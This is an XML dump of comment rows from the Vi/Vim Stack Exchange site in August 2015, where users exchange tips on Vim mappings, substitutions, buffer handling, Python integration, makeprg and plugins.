  <row Id="5992" PostId="4126" Score="0" Text="That depends on how you compile and run it? What do you use? `:make`?" CreationDate="2015-08-01T00:58:23.157" UserId="205" />
  <row Id="5993" PostId="4127" Score="5" Text="Because mapping `&lt;s-c&gt;` in insert mode means `Shift-c` or an uppercase letter c.  Thus, you cannot type an uppercase letter c in insert mode." CreationDate="2015-08-01T01:26:05.643" UserId="865" />
  <row Id="5994" PostId="4126" Score="0" Text="@muru No, I just typed :!g++ E9.26.cpp then ran the program with :!./a.out." CreationDate="2015-08-01T01:32:57.540" UserId="3022" />
  <row Id="5995" PostId="4125" Score="0" Text="Ok. Thank you for sharing your solution I wouldn't have thought of doing it this way!" CreationDate="2015-08-01T09:01:12.607" UserId="1841" />
  <row Id="5996" PostId="4074" Score="0" Text="My bad, I saw that you closed the issue with reference to a revision (at least I think that was you). I assumed you submitted the revision as well. In general I think an explanation to go with the link would enhance understanding, but since the question is put on hold as duplicate it probably doesn't matter." CreationDate="2015-08-01T09:06:58.440" UserId="1306" />
  <row Id="6000" PostId="4123" Score="1" Text="@VanLaser And then you could make that operation stateless, by getting rid of that global variable.  Perhaps there's a function that could take care of that.  That function might need to... Ow.  Right. :)" CreationDate="2015-08-01T13:17:31.830" UserId="2313" />
  <row Id="6001" PostId="4133" Score="0" Text="Oh it seems that my `cmdheight` was set at 4 and my function output 3 lines so I didn't get the message and as I didn't know that was an automatical behavior I didn't understand why I didn't get it. Thank you!" CreationDate="2015-08-01T13:45:10.423" UserId="1841" />
  <row Id="6002" PostId="4133" Score="0" Text="You're welcome :)" CreationDate="2015-08-01T13:45:38.003" UserId="1800" />
  <row Id="6003" PostId="4134" Score="1" Text="`py vim.current.buffer.append(str(sum([x^2 for x in range(100)])), vim.current.window.cursor[0])`" CreationDate="2015-08-01T16:37:18.057" UserId="1145" />
  <row Id="6004" PostId="4134" Score="0" Text="@AlexKroll This gives me an error:&#xA;&#xA;    `Traceback (most recent call last):&#xA;       File &quot;&lt;string&gt;&quot;, line 1 in &lt;module&gt;&#xA;    NameError: name 'vim' is not defined`" CreationDate="2015-08-01T18:21:50.050" UserId="2804" />
  <row Id="6005" PostId="4134" Score="1" Text="'py import vim' of course!" CreationDate="2015-08-01T18:23:34.323" UserId="1145" />
  <row Id="6006" PostId="4134" Score="0" Text="@AlexKroll I was completely unaware that Python had a vim module (or does it?) I prefer your solution to philolo1's but if someone could point me to a command to append the result to a register, that would be great.&#xA;If you make this an answer I'll probably accept it." CreationDate="2015-08-01T18:34:04.903" UserId="2804" />
  <row Id="6007" PostId="4134" Score="0" Text="If your Vim compiled with `+python` or `+puthon3` internal Python interpreteur have module `vim`,&#xA;&#xA;`:he python-vim` for more exploration." CreationDate="2015-08-01T19:02:51.210" UserId="1145" />
  <row Id="6008" PostId="4135" Score="0" Text="I'm curious: why use `eval` instead of `python -c`?" CreationDate="2015-08-01T19:22:13.823" UserId="205" />
  <row Id="6009" PostId="4135" Score="0" Text="No reason, i did not know the command, so you can also so do &#xA;python -c &quot;[x^2 for x in range(100)]&quot;." CreationDate="2015-08-02T01:42:17.937" UserId="3003" />
  <row Id="6010" PostId="4135" Score="0" Text="`python -c 'print [x^2 for x in range(100)]'`, but yes." CreationDate="2015-08-02T01:42:50.883" UserId="205" />
  <row Id="6011" PostId="4117" Score="0" Text="@VanLaser If you edit the answer with this info ([\s] is a possibilty in other regex-implementations but not in vim) i'll accept your answer!" CreationDate="2015-08-02T05:23:09.223" UserId="129" />
  <row Id="6012" PostId="4132" Score="0" Text="`echomsg` is your friend.  See also `:help interactive-functions`." CreationDate="2015-08-02T07:28:17.797" UserId="2313" />
  <row Id="6013" PostId="4060" Score="0" Text="Another option is to put the Control key next to the space bar (where Alt is now), so you can press it with your thumb. That is where it used to be on early terminal systems. http://world.std.com/~jdostale/kbd/SpaceCadet1.jpeg" CreationDate="2015-08-02T09:25:48.763" UserId="630" />
  <row Id="6014" PostId="4136" Score="0" Text="It looks to me like this uses vim to evaluate the expression and not python." CreationDate="2015-08-02T11:23:35.577" UserId="2804" />
  <row Id="6015" PostId="4136" Score="0" Text="You're right! Look edited answer!" CreationDate="2015-08-02T12:20:18.553" UserId="1145" />
  <row Id="6016" PostId="4132" Score="0" Text="@SatoKatsura: I'm not sure using `echom` wouldn't change the behavior of the &quot;pause&quot; after the message and the user has to use the command `:messages` to see what was output which isn't very convenient in my opinion." CreationDate="2015-08-02T12:23:56.697" UserId="1841" />
  <row Id="6017" PostId="4117" Score="0" Text="(all right, added)" CreationDate="2015-08-02T14:53:18.283" UserId="1800" />
  <row Id="6018" PostId="4136" Score="0" Text="This is exactly what I had in mind. I added support for floating point numbers to avoid `E806: using Float as a String`." CreationDate="2015-08-02T15:31:30.863" UserId="2804" />
  <row Id="6019" PostId="4132" Score="0" Text="`echomsg` messages are persistent, `echo` ones are ephemeral, they're gone at the next refresh whether you managed to see them or not.  The point is, you should probably adapt what you want to do to the way Vim works, rather than trying to do it the other way around." CreationDate="2015-08-02T16:59:06.537" UserId="2313" />
  <row Id="6020" PostId="4132" Score="0" Text="Maybe &quot;persistent&quot; wasn't the best word to describe what I meant: I just wanted to get the line waiting for a user input (and VanLaser answer was excatly the explanation I needed). But you're right `echom` are more persistent. Also I can't agree more with you when you say that I should follow the way Vim works, that's what I'll try to do ;-)" CreationDate="2015-08-02T17:48:22.383" UserId="1841" />
  <row Id="6021" PostId="4140" Score="2" Text="Filed https://code.google.com/p/vim/issues/detail?id=390 for it. There was a related older issue https://code.google.com/p/vim/issues/detail?id=183 which was closed as not reproducible and presumed fixed by patch 7.4.207." CreationDate="2015-08-02T21:27:28.957" UserId="824" />
  <row Id="6022" PostId="4142" Score="0" Text="thanks `:set expandtab` allowed me to use spaces instead of tabs for indentation" CreationDate="2015-08-02T23:45:16.707" UserId="3030" />
  <row Id="6023" PostId="4028" Score="0" Text="@8bittree: That ... That would be indeed better." CreationDate="2015-08-03T06:50:19.800" UserId="622" />
  <row Id="6024" PostId="4144" Score="0" Text="What problems are you facing? Does the text look wrong? Or are you having problems inputting characters? Or something else?" CreationDate="2015-08-03T08:21:57.270" UserId="51" />
  <row Id="6025" PostId="4149" Score="2" Text="Better yet: `:'&lt;,'&gt;-1s/\n/, /` for marked lines, or `:1,$-1s/\n/, /` for the entire file." CreationDate="2015-08-03T08:33:34.473" UserId="2313" />
  <row Id="6026" PostId="4149" Score="0" Text="Indeed, that's even better :)" CreationDate="2015-08-03T08:35:18.800" UserId="1800" />
  <row Id="6028" PostId="4155" Score="0" Text="The thing with `global` is that one should use `normal` only at the end of the pattern. In my understanding, you can't &quot;come back&quot; to cmd mode once you went to using `normal`. I can't find the reference, and I hope I'm not mistaken (maybe somebody knows better and can intervene with details/corrections)." CreationDate="2015-08-03T11:16:28.363" UserId="1800" />
  <row Id="6029" PostId="4155" Score="0" Text="Well, the command may be one long `normal` command, but that should be ok, shouldn't it? F.i. I begin the substitute from within the normal command with `:/s` rather than using `bar` and a separate ex command, ` | s/`." CreationDate="2015-08-03T11:32:25.363" UserId="1306" />
  <row Id="6030" PostId="4155" Score="0" Text="I know you can't use `|` to separate commands after `normal` since it is treated as an argument and not a command separator. I tried using `execute &quot;normal ...&quot;` as well, but then I had to do lots of escaping in the search and substitute patterns (e.g., `\\s`)." CreationDate="2015-08-03T11:33:11.523" UserId="1306" />
  <row Id="6032" PostId="4124" Score="0" Text="Thanks, `:SQLSetType` was exactly what I needed." CreationDate="2015-08-03T12:30:36.460" UserId="1453" />
  <row Id="6033" PostId="4146" Score="2" Text="Very nifty technique! It looks like this solution would work great with multiple files having the same namespace to convert, since it remembers the IDs globally. My answer falls short there." CreationDate="2015-08-03T12:40:52.860" UserId="227" />
  <row Id="6034" PostId="4150" Score="0" Text="&quot;If all you have is a hammer everything looks like a nail.&quot; - For more complex text manipulation tasks one should better use standard text processors (awk, perl, ...) than an editor. - E.g. with awk (assuming the data fields are TAB separated, otherwise the `\t` has to be redefined): `BEGIN {FS=&quot;\t&quot;;OFS=&quot;,&quot;} /^[^\t]/{s=$0;next} {print s,$2,$3}` - Since this is &quot;OT&quot; I just provide this comment. I think it's worth to get a feeling when it's appropriate to switch tools." CreationDate="2015-08-03T12:48:43.007" UserId="2479" />
  <row Id="6035" PostId="4159" Score="1" Text="I'm not really sure what you're asking here..." CreationDate="2015-08-03T13:35:33.880" UserId="51" />
  <row Id="6036" PostId="4159" Score="4" Text="Could you give an example of what you want to do? It is not clear in this question I think you're looking for visual block mode but I'm not sure. EDIT: CarpetSmoker the Lucky Luke of comments was faster :-)" CreationDate="2015-08-03T13:35:56.683" UserId="1841" />
  <row Id="6037" PostId="4162" Score="0" Text="`gqie` does what I want when inside a begin...end block, in the main text body it tries to wrap everything until \end{document} - is there a way to tell it to stop at the next blank line?" CreationDate="2015-08-03T13:53:02.190" UserId="3034" />
  <row Id="6038" PostId="4162" Score="0" Text="Well, outside an environment - maybe the default `gqap` ?" CreationDate="2015-08-03T13:54:34.127" UserId="1800" />
  <row Id="6040" PostId="4162" Score="0" Text="See the updated answer, for a possible `F8` remapping." CreationDate="2015-08-03T14:19:43.950" UserId="1800" />
  <row Id="6041" PostId="4162" Score="0" Text="I presume I have a typo somewhere as the following doesn't work: `:map &lt;F8&gt; gq/\(^$\|^[%]$\|^\\end\)&lt;CR&gt;`. Can anyone tell me what I'm doing wrong? I'm trying to match a completely empty line (`^$`), a line with only a % comment character (`^[%]$`) or a line starting `\end` (`^\\end`)." CreationDate="2015-08-03T14:23:12.520" UserId="3034" />
  <row Id="6042" PostId="4162" Score="0" Text="I think you must use `\\|` as separator instead of `\|` when mapping." CreationDate="2015-08-03T14:25:32.390" UserId="1800" />
  <row Id="6043" PostId="4162" Score="0" Text="That was it! (Although it's `\\|` not `\\I`.)&#xA;The expression that I finally chose: &#xA;`gq/\(^$\\|^[%]$\\|^\\end\)`" CreationDate="2015-08-03T14:27:05.773" UserId="3034" />
  <row Id="6044" PostId="4162" Score="0" Text="Yes, ninja edited :)" CreationDate="2015-08-03T14:27:58.190" UserId="1800" />
  <row Id="6046" PostId="4144" Score="1" Text="Check this one http://serverfault.com/questions/158473/languages-in-vim-editor" CreationDate="2015-08-03T14:46:24.783" UserId="1145" />
  <row Id="6047" PostId="4144" Score="1" Text="@Carpetsmoker Yes, the text looks wrong, in different ways depending on which terminal emulator I try to run vim in. Somebody has made a nice overview of the different output he gets, http://benizi.com/vim/devanagari/ , which is not exactly the same for me, but you can get a rough idea about the varieties of output, none of which is correct. In fact, in contrast to the author of mentioned website, I get the best results in `konsole`." CreationDate="2015-08-03T15:48:05.163" UserId="2774" />
  <row Id="6048" PostId="4144" Score="1" Text="@AlexKroll Yes, I know there are other ways to input devanagari in linux, that is not the problem. I can use `gedit` if I must, it does work for devanagari input, however I'd just like to stick with `vim`. `Emacs` seems to handle Devanagari without problem, I might learn it because of that, as I now have to regularly edit files containing pieces of text in devanagari script." CreationDate="2015-08-03T16:01:32.300" UserId="2774" />
  <row Id="6049" PostId="4144" Score="0" Text="If you're using a terminal emulator (Konsole), then the problem is in the terminal emulator. All Vim does is ask the terminal emulator *&quot;Hey, I have these characters with such and such code points, please render them for me. kthxbye&quot;*. gVim doesn't depend on a terminal emulator, but &quot;under the hood&quot; it's really a terminal emulator, I'm not surprised that a comparatively little used script doesn't work well (not all [Latin fonts work well with gVim either](http://vi.stackexchange.com/q/588/51))..." CreationDate="2015-08-03T17:16:19.383" UserId="51" />
  <row Id="6050" PostId="4144" Score="0" Text="... Emacs, on the other hand, has it's own drawing code, and is much more advanced in this area. Emacs is miles ahead of Vim when it comes to font support and good looking typography." CreationDate="2015-08-03T17:17:10.627" UserId="51" />
  <row Id="6051" PostId="4149" Score="0" Text="@SatoKatsura can you explain the `-1`?" CreationDate="2015-08-03T18:12:19.570" UserId="67" />
  <row Id="6052" PostId="4163" Score="1" Text="The Vim way might be to use a plugin like http://algorithm.com.au/code/vimacs/. :P Can you include an explanation of what these commands do in emacs?  A list of Ctrl/Alt/Meta-foo/bar is quite meaningless for anyone who doesn't use emacs. And Ctrl-W deletes the word before the cursor. Also, I have a feeling this is a bit too broad." CreationDate="2015-08-03T18:34:33.980" UserId="205" />
  <row Id="6053" PostId="4163" Score="1" Text="If we're going the plugin way you should check out https://github.com/tpope/vim-rsi" CreationDate="2015-08-03T19:14:34.013" UserId="428" />
  <row Id="6054" PostId="4164" Score="0" Text="Using motions (such as `End` or arrow keys) in `INSERT` mode is OK?" CreationDate="2015-08-03T19:46:15.990" UserId="2932" />
  <row Id="6055" PostId="4164" Score="4" Text="Of course, anything that makes your work easier." CreationDate="2015-08-03T19:57:04.997" UserId="54" />
  <row Id="6056" PostId="4156" Score="0" Text="Yes! This is exactly what I was doing, and yet it never occurred to me that I could execute a macro from `global//normal`. I kept building my commands in a buffer and yank-putting with `&lt;C-r&gt;` into the `:global` command. This would make it easier to build the actual command to be executed." CreationDate="2015-08-03T20:38:54.407" UserId="1306" />
  <row Id="6057" PostId="4149" Score="1" Text="@alxndr - it's used to skip the last line in the range/file: e.g. in the OP example, you don't want a comma after 32, and also you don't want to join it with the next line, if it exists. You can even use `'&lt;,'&gt;-s/\n/, /` or `1,$-s/\n/, /` as `-` is the same as `-1`." CreationDate="2015-08-03T20:41:14.617" UserId="1800" />
  <row Id="6058" PostId="4166" Score="3" Text="Writing is *NOT* linear. Anyone who can write prose (or code) from start to finish without performing some kind of edit is either insane or has the power of a God. For the rest of us we do more editing then writing and therefore thinking about your editor as performing edit commands (NORMAL mode) first and writing (INSERT mode) second is more efficient. And this is the true crux of why editors like Emacs, MS Word, Notepad, etc. are backwards in their approach. It is unfortunate that the mode-less concept exists but there must be a lowest common denominator." CreationDate="2015-08-03T20:54:27.920" UserId="544" />
  <row Id="6059" PostId="4150" Score="0" Text="@Janis Absolutely! But I don't think Vim is a hammer in this instance :-) I would like to know `awk` better and I am grateful for the example, but a) it would be a dubious investment to learn an external tool for something that is well within Vim's purview, and b) your command is actually more complex than the simplest working solution within Vim, especially if I add the 'padding' of invoking `awk` from within Vim as a filter so I can continue editing the text in Vim afterwards." CreationDate="2015-08-03T20:57:47.787" UserId="1306" />
  <row Id="6060" PostId="4155" Score="1" Text="I usually use `execute normal` to get back to command mode with global. One way to avoid lots of ``\`` is to use single quotes `'` instead of double `&quot;` to surround normal, as in `execute 'normal ...'`. See `:help literal-string` vs `:help expr-string` or, more generally, the bottom of section 41.2 on variables `:help 41.2` in the section &quot;STRING VARIABLES AND CONSTANTS&quot; (actually, its quicker to do `:help 41.3` and scroll up a couple pages)" CreationDate="2015-08-04T01:59:14.293" UserId="227" />
  <row Id="6061" PostId="4155" Score="0" Text="Oh, I have misunderstood the paragraph at `:h exe|/nice` to say that I _must_ give control characters in the `\&lt;Esc&gt;` form with the execute command. Since that form won't work in `''` strings, I thought I had to put control characters in expression strings, so, either do extra escapes (`&quot;/^\\S\&lt;CR&gt;&quot;`) or maybe concatenate literal and expression strings (`'/^\S' . &quot;\&lt;CR&gt;&quot;`). I see now that it says 'nice', not 'necessary', and `'/^\S^M'` seems to work just fine. Thanks!" CreationDate="2015-08-04T07:42:04.617" UserId="1306" />
  <row Id="6062" PostId="4167" Score="3" Text="I recommand : https://github.com/Shougo/neocomplete.vim, There is autocompletion for vimscript :)" CreationDate="2015-08-04T09:13:18.630" UserId="1821" />
  <row Id="6063" PostId="4168" Score="0" Text="I can't really answer that, but check `:h colorcolumn`, this is a standard option for vim. The help states &quot;Will make screen redrawing slower.&quot;, so you won't probably get around that, but maybe the internal implementation is atleast faster then your version." CreationDate="2015-08-04T09:32:11.237" UserId="1296" />
  <row Id="6064" PostId="4168" Score="0" Text="with a `set cc=+1` and a `set textwidth=80` I get the 81th column colored with no performance issue, so I'll stick to that for the moment, thanks for the advice" CreationDate="2015-08-04T09:45:22.937" UserId="1821" />
  <row Id="6065" PostId="4161" Score="0" Text="The [README also mentions this](https://github.com/tomasr/molokai): *&quot;256-Color terminals are also supported, though there are some differences with the Gui version.&quot;* ..." CreationDate="2015-08-04T10:12:44.917" UserId="51" />
  <row Id="6066" PostId="3324" Score="0" Text="Note that many terminals allow configuration of the colours they use, so you can use the same shade of red/blue/etc. as gVim uses. You're still limited to 256 colours in total though, and the changes apply to all programs. *Some* terminals also have the concept of &quot;profiles&quot;, so you may be able to create a &quot;Vim profile&quot; for those terminals." CreationDate="2015-08-04T10:14:49.097" UserId="51" />
  <row Id="6067" PostId="4167" Score="1" Text="I'm not sure what exactly are you asking for. YouCompleteMe does autocomplete vimscript key words. Are you asking for autocomplete plugin written entirely in vimscript?&#xA;&#xA;Also I believe that vimscript autocompletion is builtin in the omnicompletion." CreationDate="2015-08-04T11:19:43.937" UserId="428" />
  <row Id="6068" PostId="4170" Score="0" Text="If your problem is that your mappings move the cursor why don't you do `nnoremap &lt;Leader&gt;d kddj` and `nnoremap &lt;Leader&gt;D jddk`?" CreationDate="2015-08-04T12:00:04.337" UserId="1841" />
  <row Id="6069" PostId="4170" Score="0" Text="Using either `kddj` or `jddk`, column position is not preserved. I'm not saying it's a big problem, but it's annoying.&#xA;&#xA;For the record, `kddj` moves cursor 1 line below original position. And `jdd-` seems like a better alternative to `jddk` because at least I'm returning to first non white space character. If line below the one I want deleted is empty, I'm left at the beginning of the line." CreationDate="2015-08-04T12:04:49.643" UserId="1733" />
  <row Id="6070" PostId="4170" Score="0" Text="How about using makdd`a for your map? Sets a mark and returns to it afterwards... you might want to change it to a lesser used character though." CreationDate="2015-08-04T12:17:52.940" UserId="1296" />
  <row Id="6072" PostId="4150" Score="0" Text="Don't get me wrong; vim is great! - Where I have my reservations, though, is when it comes to implementing non-standard vim-script solutions, where even the very powerful vi/vim-base can't solve the issue. - From your point (b) I get the impression that you want to do everything from **built-ins** within vim - I think this is (in case of complex tasks) not appropriate (YMMV). The solution (IMO) is to use the existing (or new) external tool(s) and apply vi/vim's `!G` command. - WRT learning new things; it's your choice whether you learn vim-specifics or a (POSIX) standard tool." CreationDate="2015-08-04T13:30:40.983" UserId="2479" />
  <row Id="6073" PostId="4172" Score="0" Text="1. One of tons articles: http://www.alexeyshmalko.com/2014/using-vim-as-c-cpp-ide/&#xA;2. `set makeprg=make\ -f\ ring_buffer.makefile`" CreationDate="2015-08-04T14:27:57.203" UserId="1145" />
  <row Id="6074" PostId="4163" Score="1" Text="When moving from programming language &quot;A&quot; to &quot;B&quot;. It is best **not** to write &quot;B&quot; in the style of &quot;A&quot; but rather learn the standard idioms of &quot;B&quot; (its a hard lesson for most developers). Same rule applies for editors. Don't try and apply the standard workflow of editor &quot;A&quot; to your new editor &quot;B&quot;. Prefer to learn the idioms of using &quot;B&quot; directly. Bigger learning curve but much more productive in the long run. In `vim` when editing you spend most of your time in normal mode not in insert mode." CreationDate="2015-08-04T14:34:48.923" UserId="383" />
  <row Id="6075" PostId="4172" Score="0" Text="What is the purpose of the '\' char after each option?" CreationDate="2015-08-04T15:00:54.220" UserId="3050" />
  <row Id="6076" PostId="4172" Score="0" Text="`\ ` is a escaped space symbol. See `:he makeprg` for examples and explanations." CreationDate="2015-08-04T15:02:53.150" UserId="1145" />
  <row Id="6077" PostId="4172" Score="0" Text="Thank you.  Actually I did read the help, but being so new to VIM, it is hard to understand.  Things that you advanced users take for granted are sometimes a mystery to a beginner like me." CreationDate="2015-08-04T15:24:53.810" UserId="3050" />
  <row Id="6078" PostId="4174" Score="1" Text="OP mentioned that he already tried YCM. You mentioned ultisnips which isn't an autocompletion plugin but snippets plugin which contains like 3 vimscript related snippets." CreationDate="2015-08-04T15:31:50.503" UserId="428" />
  <row Id="6079" PostId="4172" Score="0" Text="If I wanted to add error window `:copen`, I tried the follwoing: `set makeprg=make\ -f\ ring_buffer.makefile | copen`, but it still goes to the terminal.  Any way to prevent it from flashing the terminal?" CreationDate="2015-08-04T15:58:20.630" UserId="3050" />
  <row Id="6080" PostId="4172" Score="0" Text="Note: `:make` executes make program which you set with `set makeprg` and opens window with errors. `:!make` fires up your shell and make inside it. You shouldn't pipes outputs to copen with `set makeprg`." CreationDate="2015-08-04T16:35:28.023" UserId="1145" />
  <row Id="6081" PostId="4172" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/26587/discussion-between-user1135541-and-alex-kroll)." CreationDate="2015-08-04T17:30:37.403" UserId="3050" />
  <row Id="6082" PostId="4167" Score="0" Text="maybe it is not clear, i want something that gives me all the vimscript functions like when I write somethin in vimscript, it autocompletes like the internal join function or *bpre* and it suggests bprevious like i have when i write an ex-command.&#xA;&#xA;Somethink like   autocmd FileType vim set omnifunc=????????" CreationDate="2015-08-04T18:53:32.540" UserId="3003" />
  <row Id="6083" PostId="4167" Score="0" Text="But that's exactly what YCM does: https://asciinema.org/a/1c2gyfpft51rnoptt86bjvvwr&#xA;&#xA;This is youcompleteme running in vim 7.3.&#xA;&#xA;You stated that you have YCM installed. Are you not happy with it and looking for something else or does it not work for you?" CreationDate="2015-08-04T22:03:43.443" UserId="428" />
  <row Id="6084" PostId="4148" Score="0" Text="You could also like https://github.com/sk1418/Join (not tested)." CreationDate="2015-08-04T22:47:38.823" UserId="1800" />
  <row Id="6085" PostId="4149" Score="0" Text="2nd update; at this point it just became a &quot;create an interactive operator with count and repeat support&quot; exercise for myself." CreationDate="2015-08-04T22:50:21.530" UserId="1800" />
  <row Id="6086" PostId="4173" Score="1" Text="That still moves the cursor, though." CreationDate="2015-08-05T06:27:29.350" UserId="1296" />
  <row Id="6087" PostId="4173" Score="1" Text="You can't avoid moving the cursor. The best you can do is move the cursor *and move it back*." CreationDate="2015-08-05T07:51:31.877" UserId="54" />
  <row Id="6088" PostId="4173" Score="0" Text="Thank you! This kind of &quot;vim way&quot; is what I was looking for. I'm going to use this in combination with `` to get the cursor back where it was." CreationDate="2015-08-05T08:44:31.730" UserId="1733" />
  <row Id="6089" PostId="4170" Score="0" Text="@PhilippFrank Or I can use `` to get the cursor back and not occupy a register (not that I use any :) )." CreationDate="2015-08-05T08:46:25.203" UserId="1733" />
  <row Id="6090" PostId="4171" Score="0" Text="Thank you for the effort. If there had not been &quot;in-vim&quot; way of doing it with `-d`, this is how I imagined it could work." CreationDate="2015-08-05T08:47:48.853" UserId="1733" />
  <row Id="6091" PostId="4171" Score="0" Text="You're welcome :-)" CreationDate="2015-08-05T08:50:10.920" UserId="1841" />
  <row Id="6092" PostId="4170" Score="0" Text="No that doesn't work, k is not a jump, so you cannot go back using ``." CreationDate="2015-08-05T09:15:35.747" UserId="1296" />
  <row Id="6093" PostId="4170" Score="0" Text="You're right. I was trying `` with `:-d`, not with `kdd`." CreationDate="2015-08-05T09:18:57.400" UserId="1733" />
  <row Id="6094" PostId="4170" Score="0" Text="And :-d induces a jump? Interesting, I did not know that. Thanks!" CreationDate="2015-08-05T09:25:15.870" UserId="1296" />
  <row Id="6095" PostId="4181" Score="0" Text="Why not a simple download ?" CreationDate="2015-08-05T16:15:42.703" UserId="54" />
  <row Id="6096" PostId="4181" Score="0" Text="@romainl What do you mean by &quot;simple download&quot;?" CreationDate="2015-08-05T17:05:50.047" UserId="3064" />
  <row Id="6097" PostId="4182" Score="3" Text="Using `set autoread` sort of does this, but has limitations. See [my answer here](http://vi.stackexchange.com/a/2731/51), which also includes a possible solution." CreationDate="2015-08-05T18:08:52.890" UserId="51" />
  <row Id="6098" PostId="4181" Score="0" Text="Well, you download [the latest snapshot](https://github.com/macvim-dev/macvim/releases), you install it like any other application and you go back to work." CreationDate="2015-08-05T18:08:56.927" UserId="54" />
  <row Id="6099" PostId="4182" Score="0" Text="Also very similar to: [How can I have vim automatically notify me when a file that I am editing changes?](http://vi.stackexchange.com/q/2709/51)" CreationDate="2015-08-05T18:12:02.070" UserId="51" />
  <row Id="6101" PostId="4149" Score="1" Text="If `l:sep` is an `&amp;`, then your replacement will work incorrectly, since `&amp;` is magic in the replacement.  Might be better to use the `\=` to use a literal string -- `let l:subst = 's/\n\+/\=' . &quot;'&quot; . l:sep . &quot;'/&quot;` -- instead of trying to handle escaping." CreationDate="2015-08-05T20:29:48.057" UserId="15" />
  <row Id="6102" PostId="4149" Score="0" Text="@jamessan - Thanks, this is good stuff, edited :)" CreationDate="2015-08-05T20:47:29.587" UserId="1800" />
  <row Id="6103" PostId="4184" Score="0" Text="`:syntax match Error &quot;ur_term&quot;` works. However, how to make it case insensitive? Thanks." CreationDate="2015-08-05T22:18:10.773" UserId="1080" />
  <row Id="6105" PostId="4181" Score="0" Text="@romainl Done exactly that, as stated in question about github &quot;releases&quot; section. Clicking on MacVim icon in &quot;Applications&quot; starts it, but Terminal.app is also started alongside with it." CreationDate="2015-08-06T06:54:36.460" UserId="3064" />
  <row Id="6106" PostId="4185" Score="5" Text="Have you read the corresponding doc at `:h UltiSnips-snippet-search-path`? It precises that your directory `UltiSnipsNewDir` must be a sub directory of one of them defined in `runtimepath`, is your new directory placed in the right place?" CreationDate="2015-08-06T08:21:03.163" UserId="1841" />
  <row Id="6107" PostId="4186" Score="2" Text="This is not possible without some serious hackery, and also not really desirable, the definition of a &quot;line&quot; is 0 or more characters ended by a newline, if you change that definition, you change *a lot* in Vim. For example, what would you expect `,3s/A/B/` to do? Use the next 3 lines? Or the next 3 &quot;wrapped lines&quot;? I understand why you're asking this, but I think your proposed 'solution' will cause you more problems than you will solve." CreationDate="2015-08-06T08:32:22.283" UserId="51" />
  <row Id="6109" PostId="4184" Score="0" Text="Updated answer accordingly (`\c` flag)." CreationDate="2015-08-06T08:49:22.800" UserId="1800" />
  <row Id="6110" PostId="4186" Score="0" Text="Perhaps consider (automatically) hardwrapping your lines: if you edit in markdown, or LaTeX, there's no difference; and you can also `J`oin lines at any time. You get all the benefits, with none of the disadvantages." CreationDate="2015-08-06T09:02:01.333" UserId="1800" />
  <row Id="6113" PostId="4187" Score="2" Text="I don't reproduce your error, can you try with `set hidden` ?" CreationDate="2015-08-06T13:10:25.400" UserId="1821" />
  <row Id="6114" PostId="4187" Score="0" Text="With `hidden` enabled it works." CreationDate="2015-08-06T13:12:16.990" UserId="1066" />
  <row Id="6115" PostId="4191" Score="0" Text="I find it strange though. Since the operation I want to run is writing the buffer, I would expect that vim attempts to do that first, before switching to the next buffer." CreationDate="2015-08-06T13:16:35.400" UserId="1066" />
  <row Id="6116" PostId="4191" Score="0" Text="You should really look at `:h hidden` ;) I quote &quot;The commands that move through the buffer list sometimes make a buffer hidden although the 'hidden' option is off ...&quot;" CreationDate="2015-08-06T13:17:39.010" UserId="1821" />
  <row Id="6117" PostId="4191" Score="0" Text="I read it, but I don't understand how it relates." CreationDate="2015-08-06T13:54:47.520" UserId="1066" />
  <row Id="6118" PostId="4191" Score="2" Text="I think that when you enter `:bufdo w`, vim first switchs to the first buffer to write it, then, go to the second one and write it, and so on.. So your current buffer becomes hidden, which is forbidden without setting the `hidden` option." CreationDate="2015-08-06T13:57:42.100" UserId="1821" />
  <row Id="6119" PostId="4186" Score="0" Text="Thanks for both comments. I see your point carpetsmoker although I wish it were different. True, vanlaser but other languages aren't so kind and oftentimes I only want to sometimes see the end of the line (ie huge JavaScript arrays)" CreationDate="2015-08-06T14:27:28.710" UserId="217" />
  <row Id="6120" PostId="4191" Score="0" Text="Okay, that sounds reasonable. Not sure if I'm the only one, but I rarely find it trivial to understand vim's documentation when it comes to non-obvious features." CreationDate="2015-08-06T14:44:01.560" UserId="1066" />
  <row Id="6121" PostId="4190" Score="1" Text="This is not how Vim behaves for me (and I can't recall ever seeing this behaviour). Either something in the vimrc, or the filetype you're using is causing this." CreationDate="2015-08-06T14:58:40.970" UserId="51" />
  <row Id="6122" PostId="4190" Score="0" Text="Do you know what options I can see to 'debug' this ?" CreationDate="2015-08-06T14:59:19.310" UserId="1821" />
  <row Id="6123" PostId="4190" Score="1" Text="You can try the steps in [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51)" CreationDate="2015-08-06T14:59:57.157" UserId="51" />
  <row Id="6124" PostId="4190" Score="0" Text="great, I'll update my post if I get something new, thanks" CreationDate="2015-08-06T15:00:57.073" UserId="1821" />
  <row Id="6125" PostId="4187" Score="0" Text="My guess is, your current buffer is modified. And when doing :bufdo, Vim first tries to go to the first buffer, which isn't allowed, unless you set hidden or write the current buffer first." CreationDate="2015-08-06T20:52:25.070" UserId="71" />
  <row Id="6126" PostId="4191" Score="0" Text="@Nobe4 @oarfish In fact, if you do `:help bufdo` it shows that it works as `:bfirst` `:{cmd}` `:bnext` `{cmd}` etc. which confirms what you are seeing :-)" CreationDate="2015-08-07T02:14:14.400" UserId="227" />
  <row Id="6127" PostId="4191" Score="0" Text="If you're finding the need to write all buffers, I'm guessing you're already using some `!`s in your edit / file navigation commands. It would be appropriate to follow that pattern, using `:bufdo! write`. However, for reasons unrelated to this problem, I'd still highly recommend setting `'hidden'`." CreationDate="2015-08-07T03:36:09.133" UserId="64" />
  <row Id="6128" PostId="4191" Score="0" Text="Another possibility is that you have modified buffers open in tabs or splits, but no actual modified hidden buffers. For that scenario, `:tabdo` and `:windo` could come in handy (and they can be combined!)." CreationDate="2015-08-07T03:39:20.780" UserId="64" />
  <row Id="6129" PostId="4192" Score="0" Text="for my application (sizing for small files to get their windows to auto-size upon opening) i actually can use `gj` in a loop to scan the height. it's very very ugly, but it will not be slow because i will always terminate it within 200 steps" CreationDate="2015-08-07T04:17:20.323" UserId="390" />
  <row Id="6131" PostId="4192" Score="2" Text="Don't count (pun!) too much on any number of wrapped lines you may find, as it will change if you modify a Vim setting such as `showbreak`, `number` (with `relativenumber`), `foldcolumn` (or when using signs)." CreationDate="2015-08-07T07:13:50.287" UserId="1800" />
